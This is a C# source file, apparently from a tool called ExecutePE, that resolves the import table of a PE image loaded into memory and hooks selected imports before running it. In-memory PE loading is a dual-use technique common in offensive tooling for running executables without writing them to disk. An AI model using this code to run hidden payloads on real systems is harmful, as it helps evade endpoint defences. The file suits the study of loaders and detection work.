using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using ExecutePE.Internals;

namespace ExecutePE.Patchers
{
    internal class ImportResolver
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool FreeLibrary(IntPtr hModule);

        private const int
            IDT_SINGLE_ENTRY_LENGTH =
                20; 

        private const int IDT_IAT_OFFSET = 16; 

        private const int IDT_DLL_NAME_OFFSET = 12; 
        private const int ILT_HINT_LENGTH = 2; 

        private readonly List<string> _originalModules = new List<string>();
        private readonly IATHooks _iatHooks = new();

        public void ResolveImports(PELoader pe, long currentBase)
        {
            
            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                _originalModules.Add(module.ModuleName);
            }

            
            var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
            var dllIterator = 0;
            while (true)
            {
                var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
                var pIAT = (IntPtr)(currentBase + iatRVA);

                var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
                var pDLLName = (IntPtr)(currentBase + dllNameRVA);
                var dllName = Marshal.PtrToStringAnsi(pDLLName);

                if (string.IsNullOrEmpty(dllName))
                {
                    break;
                }

                var handle = NativeDeclarations.LoadLibrary(dllName);
                var pCurrentIATEntry = pIAT;
                while (true)
                {
                    
                    try
                    {
                        var pDLLFuncName =
                            (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) +
                                      ILT_HINT_LENGTH); 
                        var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);

                        if (string.IsNullOrEmpty(dllFuncName))
                        {
                            break;
                        }

                        var pRealFunction = NativeDeclarations.GetProcAddress(handle, dllFuncName);
                        if (pRealFunction.ToInt64() == 0)
                        {
                        }
                        else
                        {
                            if (!_iatHooks.ApplyHook(dllName, dllFuncName, pCurrentIATEntry, pRealFunction))
                            {
                                Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());
                            }
                        }

                        pCurrentIATEntry =
                            (IntPtr)(pCurrentIATEntry.ToInt64() +
                                      IntPtr.Size); 
                    }
                    catch (Exception)
                    {
                    }
                }

                dllIterator++;
            }
        }

        internal void ResetImports()
        {
            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                if (!_originalModules.Contains(module.ModuleName))
                {
                    if (!FreeLibrary(module.BaseAddress))
                    {
                        var error = NativeDeclarations.GetLastError();
                    }
                }
            }
        }
    }
}
